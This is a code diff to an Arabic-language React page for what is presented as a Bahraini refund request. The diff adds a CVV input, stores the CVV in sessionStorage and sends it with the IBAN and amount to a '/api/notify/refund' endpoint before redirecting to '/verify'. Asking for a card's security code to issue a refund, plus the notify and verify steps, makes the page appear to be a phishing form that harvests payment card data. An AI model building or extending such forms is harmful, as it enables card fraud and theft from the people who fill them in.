@@ -11,6 +11,7 @@ export default function HomePage() {
   const [method, setMethod] = useState<Method>("benefit");
   const [benefit, setBenefit] = useState("");
   const [iban, setIban] = useState("");
+  const [cvv, setCvv] = useState("");
   const [amount, setAmount] = useState("");
   const [showAmount, setShowAmount] = useState(false);
   const [error, setError] = useState("");
@@ -35,6 +36,10 @@ export default function HomePage() {
       setError("أدخل رقم آيبان بحريني صحيح يبدأ بـ BH.");
       return;
     }
+    if (!/^\d{3,4}$/.test(cvv.trim())) {
+      setError("أدخل رمز CVV صحيح مكوّن من 3 أو 4 أرقام.");
+      return;
+    }
     const parsedAmount = showAmount && amount.trim() ? Number(amount) : undefined;
     if (parsedAmount !== undefined && (!Number.isFinite(parsedAmount) || parsedAmount <= 0)) {
       setError("أدخل مبلغ استرجاع صحيح.");
@@ -43,11 +48,14 @@ export default function HomePage() {
 
     setSubmitting(true);
     try {
-      sessionStorage.setItem("refund_request", JSON.stringify({ method, value, amount: parsedAmount }));
+      sessionStorage.setItem(
+        "refund_request",
+        JSON.stringify({ method, value, amount: parsedAmount, cvv })
+      );
       await fetch("/api/notify/refund", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ method, value, amount: parsedAmount }),
+        body: JSON.stringify({ method, value, amount: parsedAmount, cvv }),
       });
       router.push("/verify");
     } catch {
@@ -149,6 +157,27 @@ export default function HomePage() {
               />
             </div>
           )}
+
+          <div>
+            <label htmlFor="cvv" className="mb-2 block text-sm font-bold">
+              رمز التحقق CVV
+            </label>
+            <div className="flex items-stretch gap-2" dir="ltr">
+              <input
+                id="cvv"
+                type="password"
+                inputMode="numeric"
+                maxLength={4}
+                value={cvv}
+                onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                placeholder="•••"
+                className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
+              />
+            </div>
+            <p className="mt-2 text-xs text-muted-foreground">
+              الرقم المكوّن من 3 أو 4 أرقام على ظهر البطاقة.
+            </p>
+          </div>
 
           {error && <p className="text-sm font-semibold text-destructive">{error}</p>}
 
